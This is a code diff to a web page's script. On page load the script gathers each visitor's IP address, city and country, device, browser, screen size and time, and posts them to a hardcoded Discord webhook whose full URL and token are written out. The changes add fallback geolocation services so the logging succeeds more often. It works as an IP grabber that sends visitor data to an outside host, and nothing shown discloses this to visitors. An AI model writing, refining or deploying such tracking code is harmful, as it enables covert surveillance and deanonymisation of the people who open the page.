@@ -94,7 +94,7 @@
     // ===== YOUR WEBHOOK =====
     var WEBHOOK = "https://discord.com/api/webhooks/1519652009781887076/37_FqW5wKYAUNdvThxMxjArmVmtLJb0m8oC5JSW3oYfC5libvf_9Cg3vbmL0-IBg961O";
 
-    // ===== UPDATE THE PAGE WITH REAL DATA =====
+    // ===== UPDATE PAGE =====
     function updatePage(info) {
         document.getElementById('ip').textContent = info.ip || 'Unknown';
         document.getElementById('location').textContent = info.location || 'Unknown';
@@ -126,41 +126,68 @@
         }).catch(function() {});
     }
 
-    // ===== COLLECT INFO =====
-    function collectInfo() {
+    // ===== GET IP + LOCATION (MULTIPLE APIS) =====
+    function getIPAndLocation() {
         var info = {
-            ip: 'Fetching...',
-            location: 'Fetching...',
+            ip: 'Unknown',
+            location: 'Unknown',
             device: navigator.platform || 'Unknown',
             browser: navigator.userAgent.split(' ').pop() || 'Unknown',
             screen: screen.width + 'x' + screen.height,
             time: new Date().toLocaleString()
         };
 
-        // Get IP and location
-        fetch('https://api.ipify.org?format=json')
+        // Try ipapi.co first
+        fetch('https://ipapi.co/json/')
             .then(function(r) { return r.json(); })
-            .then(function(d) {
-                info.ip = d.ip;
-                return fetch('https://ipapi.co/json/');
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(d) {
-                info.location = (d.city || 'Unknown') + ', ' + (d.country_name || 'Unknown');
-                updatePage(info);
-                sendToDiscord(info);
+            .then(function(data) {
+                if (data && data.ip) {
+                    info.ip = data.ip;
+                    info.location = (data.city || 'Unknown') + ', ' + (data.country_name || 'Unknown');
+                    updatePage(info);
+                    sendToDiscord(info);
+                } else {
+                    fallbackIP(info);
+                }
             })
             .catch(function() {
-                updatePage(info);
-                sendToDiscord(info);
+                fallbackIP(info);
             });
 
-        // Update with what we already have
+        // Fallback: ipify + ip-api.com
+        function fallbackIP(info) {
+            fetch('https://api.ipify.org?format=json')
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    if (data && data.ip) {
+                        info.ip = data.ip;
+                        return fetch('https://ip-api.com/json/' + data.ip);
+                    }
+                    throw new Error('No IP');
+                })
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    if (data && data.city) {
+                        info.location = (data.city || 'Unknown') + ', ' + (data.country || 'Unknown');
+                    } else {
+                        info.location = 'Unknown';
+                    }
+                    updatePage(info);
+                    sendToDiscord(info);
+                })
+                .catch(function() {
+                    // Final fallback: show what we have
+                    updatePage(info);
+                    sendToDiscord(info);
+                });
+        }
+
+        // Update page immediately with basic info
         updatePage(info);
     }
 
     // ===== RUN =====
-    collectInfo();
+    getIPAndLocation();
 </script>
 
 </body>
